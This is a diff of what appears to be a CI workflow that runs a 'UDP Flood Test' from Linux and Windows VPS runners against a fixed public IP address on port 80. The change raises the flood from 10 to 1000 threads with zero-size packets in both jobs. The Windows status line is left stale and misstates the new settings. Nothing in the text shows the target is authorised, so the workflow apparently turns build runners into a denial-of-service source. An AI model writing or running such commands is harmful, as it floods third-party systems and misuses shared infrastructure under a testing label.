@@ -39,10 +39,10 @@ jobs:
       - name: Run UDP Flood Test
         run: |
           echo "🐧 Starting UDP Flood Test ${{ matrix.vps }}"
-          echo "Target: 23.176.168.11:80, Duration: 30s, Threads: 10, Packet Size: 1024"
+          echo "Target: 23.176.168.11:80, Duration: 30s, Threads: 10, Packet Size: 0"
           
           # Run UDP flood for 30 seconds with specified parameters
-          timeout 35 ./udpflood 23.176.168.11 80 30 10 1024
+          timeout 35 ./udpflood 23.176.168.11 80 30 1000 0
           
           echo "✅ Linux UDP Flood Test ${{ matrix.vps }} completed"
 
@@ -79,7 +79,7 @@ jobs:
           echo "Target: 23.176.168.11:80, Duration: 30s, Threads: 10, Packet Size: 1024"
           
           # Run UDP flood for 30 seconds with specified parameters
-          timeout 35 .\udpflood.exe 23.176.168.11 80 30 10 1024
+          timeout 35 .\udpflood.exe 23.176.168.11 80 30 1000 0
           
           echo "✅ Windows UDP Flood Test ${{ matrix.vps }} completed"
 
